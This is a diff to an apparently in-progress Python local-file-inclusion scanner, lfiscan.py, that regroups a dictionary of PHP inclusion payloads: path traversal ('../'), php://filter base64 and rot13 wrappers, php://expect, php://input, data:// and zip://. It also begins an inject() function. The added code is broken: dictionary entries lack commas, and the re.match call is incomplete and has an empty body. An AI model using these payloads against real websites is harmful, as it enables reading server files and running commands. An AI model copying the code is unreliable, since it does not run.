@@ -7,16 +7,19 @@ import threading
 from Crawler import Crawler
 
 payloads = {
-    "filter": {
-        "b64encode": "php://filter/convert.base64-encode/resource=",
-        "b64decode": "php://filter/convert.base64-decode/resource=",
-        "rot13"    : "php://filter/read=string.rot13/resource=",
-        "utf-16"   : "php://filter/convert.iconv.utf-8.utf-16/resource="
-    },
-    "expect"       : "php://expect/",
-    "input"        : "php://input",
-    "data"         : "data://text/plain;base64,",
-    "zip"          : "zip://"
+    "../": "../"
+    "php://": {
+        "filter": {
+            "b64encode": "php://filter/convert.base64-encode/resource=",
+            "b64decode": "php://filter/convert.base64-decode/resource=",
+            "rot13"    : "php://filter/read=string.rot13/resource=",
+            "utf-16"   : "php://filter/convert.iconv.utf-8.utf-16/resource="
+        },
+        "expect"       : "php://expect/",
+        "input"        : "php://input"
+    }
+    "data://"          : "data://text/plain;base64,",
+    "zip://"           : "zip://"
 }
 
 tests = ["../", "php://", "data://", "zip://"]
@@ -71,7 +74,8 @@ def craftPayload(url, itype, arguments=False):
 
 #lfiscan.py --inject --resource=index.php 
 def inject(payload):
-    pass
+    if re.match('zip://')
+        
 
 if __name__ == '__main__':
     pass
